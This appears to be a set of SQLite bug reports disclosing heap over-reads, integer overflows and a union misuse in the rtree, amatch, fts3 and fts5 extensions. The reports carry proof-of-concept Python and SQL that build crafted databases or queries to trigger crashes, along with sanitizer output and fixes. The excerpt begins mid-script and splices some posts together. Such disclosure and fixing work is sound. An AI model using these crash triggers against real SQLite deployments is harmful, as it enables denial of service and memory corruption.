cell count
# This is fragile; a more robust approach is shown below.

# Simpler: use SQLite's UPDATE on the _node table
db = sqlite3.connect(path)
# Read root node blob
root_blob = db.execute("SELECT data FROM r3tree_node WHERE
nodeno=1").fetchone()[0]
root_bytes = bytearray(root_blob)
# Patch depth bytes [0:2] to 0x0028 = 40
root_bytes[0] = 0x00
root_bytes[1] = 0x28  # 40 = RTREE_MAX_DEPTH
db.execute("UPDATE r3tree_node SET data=? WHERE nodeno=1",
(bytes(root_bytes),))
db.commit()
db.close()
print(f"[*] Created crafted rtree db: {path}")
print(f"[*] Root node depth patched to 40 (RTREE_MAX_DEPTH)")

def trigger(path):
import sqlite3
db = sqlite3.connect(path)
print("[*] Triggering: SELECT * FROM r3tree ...")
try:
list(db.execute("SELECT * FROM r3tree WHERE minx <= 100"))
print("[!] No crash — heap corruption may be silent
(ASAN/valgrind will catch)")
except Exception as e:
print(f"[*] Exception: {e}")
db.close()

if __name__ == '__main__':
path = '/tmp/rtree_oob.db'
make_rtree_db(path)
trigger(path)

Expected results:

With ASAN: heap-buffer-overflow on anQueue[41]
With valgrind: Invalid write of size 4 at rtreeSearchPointNew+...
Without sanitizers: heap metadata corruption → crash at subsequent
malloc/free,
or silent corruption depending on heap layout

Fix
Two changes needed:

1. Fix the depth comparison to be inclusive:
// ext/rtree/rtree.c line 792
if( pRtree->iDepth>=RTREE_MAX_DEPTH ){   /* >= instead of > */
rc = SQLITE_CORRUPT_VTAB;

Or alternatively, increase the array size by 1:
// ext/rtree/rtree.c line 309
u32 anQueue[RTREE_MAX_DEPTH+2];   /* +2: +1 for level sentinel, +1 for
iDepth+1 */

2. Move or add the assert to the right place:
// ext/rtree/rtree.c line 1542 (inside rtreeSearchPointNew, before array access)
assert( iLevel<=RTREE_MAX_DEPTH+1 );  /* after the fix */

The root cause is an off-by-one in the depth validation: iDepth==40 is
accepted but then used as iDepth+1=41 to index anQueue[0..40].
Either reject iDepth==40 (as corrupt) or extend the array to
RTREE_MAX_DEPTH+2.

title: Vuln91-72: amatch 16-bit Truncation of amatch_word.nMatch Causes Negative-index Heap Over-read

posts.author: ylwang (yuelinwang)
posts.body:
Summary
amatch_word.nMatch is a short int (ext/misc/amatch.c:473) but counts matched input bytes, bounded only by the attacker controlled MATCH length. The zero cost prefix path in amatchNext() (line 1185) marches nMatch up by one per step, so at 32768 the store at line 1079 wraps it to -32768. The next step uses it as an input index in strncmp(..., pCur->zInput+pWord->nMatch, ...) at line 1235, reading far before zInput (CWE-190 then CWE-125).

Reproduce
amatch is a loadable extension and is not built into the binary, so first compile it into amatch.so from the source tree (the normal supported way to use it; it only references the public sqlite3ext.h API).
gcc -g -fPIC -shared \
-I/data/ylwang/LargeScan/targets/sqlite \
/data/ylwang/LargeScan/targets/sqlite/ext/misc/amatch.c -o amatch.so

Build the malicious SQL with the script below. The vocabulary holds one long word of 200000 identical 'a' bytes; the edit-cost table carries a single rule ('Z'->'Y') that never matches the all-'a' input, so the generic insert/delete/substitute costs stay 0 and the only word expansion is the zero-cost exact-prefix path, giving a clean linear march of nMatch past 32768. The large input makes zInput a big heap allocation so the negative -32768 offset lands in an ASAN-poisoned region and is reliably reported.
#!/usr/bin/env python3
import os

N = 200000                 # >= 32768 to wrap the 16-bit nMatch; large so the OOB hits a poisoned region
word = 'a' * N
out = "vuln91.sql"

with open(out, 'w') as f:
f.write(".load ./amatch\n")
f.write("CREATE TABLE v(w);\n")
f.write("INSERT INTO v VALUES('%s');\n" % word)
f.write("CREATE INDEX vidx ON v(w);\n")
f.write("CREATE TABLE ec(iLang,cFrom,cTo,cost);\n")
f.write("INSERT INTO ec VALUES(0,'Z','Y',1);\n")    # rule that never matches 'a' -> only zero-cost prefix path
f.write("CREATE VIRTUAL TABLE f USING approximate_match("
"vocabulary_table=v, vocabulary_word=w, edit_distances=ec);\n")
f.write("SELECT word, distance FROM f WHERE word MATCH '%s';\n" % word)

print("wrote", out, "word length =", N)

How to run it:
python3 gen.py
ASAN_OPTIONS=detect_leaks=0 \
/data/ylwang/LargeScan/targets/sqlite/sqlite3 :memory: ".read vuln91.sql"

ASAN reports heap-use-after-free READ of size 1 in __interceptor_strncmp <- amatchNext (amatch.c:1235) <- amatchFilter (amatch.c:1277), the read landing 176136 bytes inside the 200032-byte input region via the wrapped negative nMatch.

Fix/* ext/misc/amatch.c: count matched input bytes in a full-width int so the
** value cannot wrap negative and be used as a buffer index. */
struct amatch_word {
amatch_cost rCost;    /* Cost of the match so far */
int iSeq;             /* Sequence number */
char zCost[10];       /* Cost key (text rendering of rCost) */
int nMatch;           /* Input characters matched (was short int) */
char zWord[4];        /* Text of the word.  Extra space appended as needed */
};
/* and at the store site (amatchAddWord): */
pWord->nMatch = nMatch;

title: SQLite 3.53.2 - MSan(MemorySanitizer) use-of-uninitialized-value in sqlite3ProcessJoin (union misuse)

posts.author: drh
posts.body:
Note: This report originally appeared on the Forum by user "Saurabh".
It was translated into proper markdown and posted here on Bugs by DRH

While running with MemorySanitizer enabled against SQLite 3.53.2, we encountered a use-of-uninitialized-value report in sqlite3ProcessJoin() (sqlite3.c). After tracing the logs we believe it is a genuine defect introduced during the 3.52/3.53 development cycle.

The union contract -
SrcItem.u1 is a union whose active member is strictly gated by flag bits. The source itself documents this at the SrcItem struct definition:

Field
Only access if this is true

u1.zIndexedBy
fg.isIndexedBy

u1.pFuncArg
fg.isTabFunc

u1.nRow
!fg.isTabFunc  && !fg.isIndexedBy

Every other access to u1.pFuncArg in the codebase respects this contract by checking fg.isTabFunc first.

The unguarded site -
Near the end of sqlite3ProcessJoin() there is a block that sets SF_OnToWhere for virtual table outer joins. In 3.53.2 it reads:
if( IsVirtual(pRightTab) && joinType==EP_OuterON && pRight->u1.pFuncArg ){
      p->selFlags |= SF_OnToWhere;
}

pRight->u1.pFuncArg is read here without first checking pRight->fg.isTabFunc. When isTabFunc is 0 the active union member is u1.nRow (an integer) or u1.zIndexedBy (a char *) those bytes are then reinterpreted as an ExprList *. Under MSan this is reported as use-of-uninitialized-value. Without MSan it is a latent type of confusion that is silent only because those bytes are usually zero.

Trigger conditions --
A SELECT that involves a virtual table on the outer side of an outer join, where the relevant   SrcItem is not a table valued function invocation (i.e., fg.isTabFunc == 0).

Summary
fts3StringAppend() (ext/fts3/fts3_snippet.c:603) does its grow test pStr->n+nAppend+1>=pStr->nAlloc at line 616 in 32-bit int while the realloc beside it uses sqlite3_int64. -- One document, the word 'a' repeated so a single 64-token snippet window
-- holds the highlighted term at least 3 times.
INSERT INTO t(x) VALUES('a a a a a a a a a a a a a a a a a a a a');

-- zStart is about 1e9 chars. Each highlighted 'a' appends it once. Three hits
-- overflow the int grow test at fts3_snippet.c:616.
SELECT length(snippet(t, hex(zeroblob(500000000)), '', '', 0, 64))
FROM t WHERE t MATCH 'a';

/data/ylwang/LargeScan/targets/sqlite/sqlite3 :memory: < vuln93.sql

Observed output. The overflow lands on the exact grow test, on the exact reported call chain, with operands that match the predicted third append (nAppend=1000000000, pStr->n=2000000004):
sqlite3.c:210440:14: runtime error: signed integer overflow:
1000000000 + 2000000004 cannot be represented in type 'int'
#0 fts3StringAppend    sqlite3.c:210440   (== fts3_snippet.c:616 grow test)
#1 fts3SnippetText     sqlite3.c:210647   (== fts3_snippet.c:823 highlight loop)
#2 sqlite3Fts3Snippet  sqlite3.c:211350
#3 fts3SnippetFunc     sqlite3.c:197347
#4 sqlite3VdbeExec
#5 sqlite3Step ... sqlite3_step ... shell_exec ... main

Fix/* ext/fts3/fts3_snippet.c */
struct StrBuffer {
char *z;                        /* Pointer to buffer containing string */
sqlite3_int64 n;                /* Length of z in bytes (excl. nul-term) */
sqlite3_int64 nAlloc;           /* Allocated size of buffer z in bytes */
};

/* fts3StringAppend(): do the grow test in 64-bit, matching the i64 realloc. */
if( pStr->n+(sqlite3_int64)nAppend+1>=pStr->nAlloc ){
sqlite3_int64 nAlloc = pStr->nAlloc+(sqlite3_int64)nAppend+100;
...
}

title: Vuln94-75: FTS5 fts5SecureDeleteOverflow Heap Over-read via Unvalidated szLeaf

posts.author: ylwang (yuelinwang)
posts.body:
Summary
fts5SecureDeleteOverflow() (ext/fts5/fts5_index.c:5148) walks continuation pages with the unchecked fts5DataRead() and at line 5174 does fts5GetVarint32(&aPg[pLeaf->szLeaf], iNext), where szLeaf comes straight from on-disk header bytes 2 and 3 with no bound against the page allocation. A malicious page with szLeaf=65535 on a 4-byte blob reads about 65KB past the buffer, far beyond the 20-byte FTS5_DATA_PADDING (CWE-125).

Reproduce
vuln94_gen.py:
#!/usr/bin/env python3
import os, struct, subprocess, sys, sqlite3

SQLITE3 = "/data/ylwang/LargeScan/targets/sqlite/sqlite3"
DB = "vuln94.db"

def seg_rowid(segid, pgno):
return (segid << 37) + pgno

def run_sql(sql):
p = subprocess.run([SQLITE3, DB], input=sql, text=True, capture_output=True)
if p.returncode != 0:
sys.exit(p.stdout + p.stderr)
return p.stdout

if os.path.exists(DB):
os.remove(DB)

a50 = " ".join(["a"] * 50)
run_sql(
"CREATE VIRTUAL TABLE t USING fts5(x);\n"
"INSERT INTO t(t, rank) VALUES('pgsz', 64);\n"
"INSERT INTO t(t, rank) VALUES('secure-delete', 1);\n"
"BEGIN;\n"
"INSERT INTO t(rowid,x) VALUES(1,'%s');\n" % a50 +
"INSERT INTO t(rowid,x) VALUES(2,'b b b');\n"
"COMMIT;\n"
)

# locate segment 1's last leaf page (pgnoLast)
out = run_sql("SELECT (id&2147483647), length(block) FROM t_data "
"WHERE (id>>37)=1 ORDER BY id;\n")
last_pgno = max(int(l.split("|")[0]) for l in out.strip().splitlines())
target = seg_rowid(1, last_pgno)

# tamper the last leaf: iNext=0, szLeaf=65535, nn=4
con = sqlite3.connect(DB)
con.execute("UPDATE t_data SET block=? WHERE id=?",
(struct.pack(">HH", 0x0000, 0xFFFF), target))
con.commit(); con.close()
print("wrote", DB, "tampered rowid", target)

Run it:
python3 vuln94_gen.py
ASAN_OPTIONS=detect_leaks=0 \
/data/ylwang/LargeScan/targets/sqlite/sqlite3 vuln94.db "DELETE FROM t WHERE rowid=1;"

ASAN reports a SEGV READ deep in the real DELETE flush path, at the exact vulnerable read:
AddressSanitizer: SEGV on unknown address 0x504000013367
The signal is caused by a READ memory access.
#0 sqlite3Fts5GetVarint32     sqlite3.c:267810
#1 fts5SecureDeleteOverflow   sqlite3.c:255680   (== fts5_index.c:5174)
#2 fts5DoSecureDelete         sqlite3.c:255858
#3 fts5FlushSecureDelete      sqlite3.c:256097
#4 fts5FlushOneHash           sqlite3.c:256198
#5 fts5IndexFlush             sqlite3.c:256331
#6 sqlite3Fts5IndexSync ... sqlite3Fts5StorageSync ... vdbeCommit ... sqlite3_step

ASAN_OPTIONS=detect_leaks=0 only silences an unrelated end-of-run leak scan. The SEGV is a genuine heap out-of-bounds read on the real execution path.

Fix
Validate szLeaf against the actual blob size before indexing with it, the same invariant fts5LeafRead() already enforces.
/* ext/fts5/fts5_index.c fts5SecureDeleteOverflow(): reject a leaf whose
** header szLeaf runs past the page before reading at aPg[szLeaf]. */
pLeaf = fts5DataRead(p, iRowid);
if( pLeaf==0 ) break;
if( pLeaf->szLeaf>pLeaf->nn ){
p->rc = FTS5_CORRUPT;
fts5DataRelease(pLeaf);
break;
}
aPg = pLeaf->p;
